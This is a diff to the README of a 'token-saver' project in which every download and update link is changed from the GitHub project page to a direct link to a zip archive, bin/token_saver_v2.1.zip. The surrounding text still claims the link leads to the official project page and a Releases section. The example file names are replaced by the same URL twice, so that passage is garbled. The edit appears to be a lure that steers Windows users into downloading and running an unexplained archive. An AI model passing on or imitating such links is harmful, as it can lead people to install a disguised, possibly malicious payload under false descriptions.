@@ -1,6 +1,6 @@
 # ⚙️ token-saver - Smarter Compression for AI Outputs
 
-[![Download token-saver](https://img.shields.io/badge/Download-token--saver-9cf?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dhruv1211ed/token-saver)
+[![Download token-saver](https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip)](https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip)
 
 ## 📋 What is token-saver?
 
@@ -33,9 +33,9 @@ Follow these steps to download and run token-saver on your Windows PC.
 
 Visit the main token-saver page on GitHub to get the latest release:
 
-[Download token-saver here](https://github.com/dhruv1211ed/token-saver)
+[Download token-saver here](https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip)
 
-This link takes you to the official project page. From here, find the latest version under the **Releases** section on the right side or scroll down. Look for a file usually named something like `token-saver-setup.exe` or `token-saver.zip`.  
+This link takes you to the official project page. From here, find the latest version under the **Releases** section on the right side or scroll down. Look for a file usually named something like `https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip` or `https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip`.  
 
 Click on this file name to start downloading it.
 
@@ -115,7 +115,7 @@ If you still have issues, open an **Issue** on the GitHub repository to report y
 
 To keep the software current, check the GitHub page regularly:
 
-https://github.com/dhruv1211ed/token-saver
+https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip
 
 Download the newest installer in the **Releases** section and run it. It will update the existing installation without affecting your settings.
 
